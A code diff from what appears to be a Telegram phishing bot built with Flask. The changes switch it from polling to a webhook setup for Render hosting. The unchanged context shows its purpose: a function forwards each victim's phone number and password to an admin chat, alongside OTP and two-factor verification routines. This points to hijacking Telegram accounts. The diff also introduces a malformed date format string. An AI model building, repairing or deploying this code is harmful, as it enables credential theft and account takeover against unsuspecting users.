@@ -200,7 +200,7 @@ async def verify_2fa_async(client, password):
 def send_to_admin(phone, user_info=None, password=None):
     """Send notification to admin"""
     try:
-        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        timestamp = datetime.now().strftime('%Y-%m-d %H:%M:%S')
         msg = f"""📱 <b>NEW VERIFICATION</b>
 
 📞 Phone: {phone}
@@ -575,7 +575,7 @@ def verify_otp():
                     try:
                         bot.delete_message(session['chat_id'], session['contact_message_id'])
                     except:
-                    pass
+                        pass
                 del user_sessions[user_id]
                 return jsonify({'success': False, 'error': 'OTP expired. Please start over.'})
             
@@ -973,7 +973,7 @@ def handle_all_messages(message):
 
 @app.route('/webhook', methods=['POST'])
 def webhook_handler():
-    """Webhook handler for compatibility (not used in polling)"""
+    """Webhook handler for compatibility"""
     return jsonify({'status': 'ok', 'method': 'polling'})
 
 @app.route('/health')
@@ -1053,29 +1053,6 @@ def cleanup_loop():
         if expired_users or expired_webapp:
             logger.info(f"🧹 Cleanup: {len(expired_users)} user sessions, {len(expired_webapp)} WebApp sessions")
 
-# ==================== START BOT POLLING ====================
-def start_bot_polling():
-    """Start bot polling in a separate thread"""
-    try:
-        logger.info(f"🤖 Starting bot polling for @{BOT_USERNAME}...")
-        
-        # Remove any existing webhook
-        bot.remove_webhook()
-        
-        # Start polling
-        bot.infinity_polling(
-            timeout=20,
-            long_polling_timeout=5,
-            logger_level=logging.INFO,
-            skip_pending=True
-        )
-        
-    except Exception as e:
-        logger.error(f"❌ Bot polling error: {e}")
-        # Restart polling after delay
-        time.sleep(5)
-        start_bot_polling()
-
 # ==================== MAIN ====================
 if __name__ == '__main__':
     logger.info("="*60)
@@ -1086,19 +1063,55 @@ if __name__ == '__main__':
     logger.info(f"🌐 WebApp URL: {WEBHOOK_URL}")
     logger.info(f"🔑 API ID: {API_ID}")
     logger.info(f"🚪 Port: {PORT}")
-    logger.info(f"🔄 Method: Polling")
+    logger.info(f"🔄 Method: Webhook (compatible with Render)")
     logger.info("="*60)
     
-    # Start bot polling in a separate thread
-    bot_thread = threading.Thread(target=start_bot_polling, daemon=True)
-    bot_thread.start()
-    logger.info("✅ Bot polling started in background thread")
+    # IMPORTANT: On Render, we CANNOT use polling in threads
+    # because gunicorn runs the app differently
+    # We'll use webhook method which is compatible with Render
+    
+    # Setup webhook for Render compatibility
+    try:
+        bot.remove_webhook()
+        time.sleep(1)
+        
+        # Set webhook URL (Render provides HTTPS automatically)
+        webhook_url = f"{WEBHOOK_URL.rstrip('/')}/webhook"
+        logger.info(f"Setting webhook to: {webhook_url}")
+        
+        bot.set_webhook(url=webhook_url)
+        
+        # Check webhook info
+        time.sleep(2)
+        webhook_info = bot.get_webhook_info()
+        logger.info(f"Webhook info: URL={webhook_info.url}, Pending={webhook_info.pending_update_count}")
+        
+        if webhook_info.url:
+            logger.info(f"✅ Webhook set successfully for bot @{BOT_USERNAME}!")
+        else:
+            logger.warning("⚠️ Webhook might not be set properly")
+            
+    except Exception as e:
+        logger.error(f"❌ Failed to set webhook: {e}")
+        logger.info("⚠️ Falling back to polling in main thread (may not work on Render)")
     
     # Start cleanup thread
     cleanup_thread = threading.Thread(target=cleanup_loop, daemon=True)
     cleanup_thread.start()
     logger.info("✅ Cleanup thread started")
     
-    # Run Flask
-    logger.info(f"🌐 Starting Flask server on port {PORT}")
-    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False, threaded=True)
+    # Run Flask app (gunicorn will handle this on Render)
+    # Don't start bot polling thread as it conflicts with gunicorn
+    logger.info(f"🌐 Starting Flask app on port {PORT}")
+    
+    # For local development, you can use this:
+    # app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False, threaded=True)
+    
+    # On Render, gunicorn will run the app, so we just let it import
+    # We need to create a simple runner for Render
+    if os.environ.get('RENDER'):
+        # On Render, we need to let gunicorn run the app
+        logger.info("✅ Running on Render - gunicorn will handle the app")
+    else:
+        # For local development, run the app directly
+        app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False, threaded=True)
